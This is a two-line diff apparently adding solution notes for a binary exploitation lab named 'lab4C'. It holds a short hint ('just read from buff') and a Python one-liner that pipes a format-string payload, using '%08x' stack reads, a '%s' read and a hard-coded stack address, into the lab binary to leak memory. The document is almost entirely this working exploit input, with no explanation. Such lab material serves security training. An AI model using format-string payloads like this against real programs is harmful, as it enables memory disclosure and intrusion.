@@ -1,0 +1,2 @@
+just read from buff
+python -c 'print ("%08x.%08x.%08x.%08x.%s"); print("AA"+"\x16\xf6\xff\xbf");' | ./lab4C
